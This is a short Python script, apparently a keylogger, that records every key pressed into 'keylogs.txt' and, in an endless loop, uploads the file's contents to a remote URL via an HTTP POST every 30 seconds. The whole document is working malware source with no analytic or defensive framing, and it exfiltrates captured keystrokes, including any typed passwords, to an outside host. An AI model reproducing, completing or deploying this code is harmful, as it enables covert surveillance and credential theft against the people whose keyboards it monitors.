filename = "keylogs.txt"
line_length = 10
log_data = ""

def on_key_press(event):
    global log_data
    
    if event.name == "space":
        log_data += "\n"
    else:
        log_data += event.name

    if len(log_data) >= line_length:
        with open(filename, "a") as f:
            f.write(log_data)
        log_data = ""

keyboard.on_press(on_key_press)

while True:
    if len(log_data) > 0:
        with open(filename, "a") as f:
            f.write(log_data)
        log_data = ""

    with open(filename, "r") as f:
        data = f.read()

    response = requests.post(url, data=data)

    print("Logs uploaded, status code:", response.status_code)

    time.sleep(30) 